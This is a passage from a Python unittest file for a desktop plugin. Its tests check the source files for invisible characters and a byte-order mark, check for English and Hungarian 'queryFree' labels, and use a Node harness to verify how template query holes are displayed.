            self.assertTrue(live.problems(live.dataset(aid, "m")))

    def test_no_invisible_character_is_written_in_the_source(self):
        src = (PLUGIN / "hermes_artifacts" / "live.py").read_text(encoding="utf-8")
        self.assertIsNone(live._INVISIBLE.search(src))
        self.assertNotIn(BOM, (PLUGIN / "desktop" / "plugin.js").read_text(encoding="utf-8"))

    def test_free_label_in_english_and_hungarian(self):
        js = (PLUGIN / "desktop" / "plugin.js").read_text(encoding="utf-8")
        self.assertEqual(js.count("    queryFree:"), 2)

    @unittest.skipIf(NODE is None, "node not installed")
    def test_query_shown_lists_free_holes(self):
        harness = r"""
const src = require('fs').readFileSync(process.argv[1], 'utf8');
const start = src.indexOf('const QUERY_SHOW_MAX'), end = src.indexOf('\n/** A dashboard');
eval(src.slice(start, end) + '\nglobalThis.queryShown = queryShown;');
console.log(JSON.stringify(queryShown({ tool: 't', args: { q: '{{q}}' }, rules: {}, free: ['q'] })));
"""
        r = subprocess.run([NODE, "-e", harness, str(PLUGIN / "desktop" / "plugin.js")], capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        rows = dict(json.loads(r.stdout)["rows"])
        self.assertEqual(rows["queryFree"], "{{q}}")


if __name__ == "__main__":
    unittest.main()
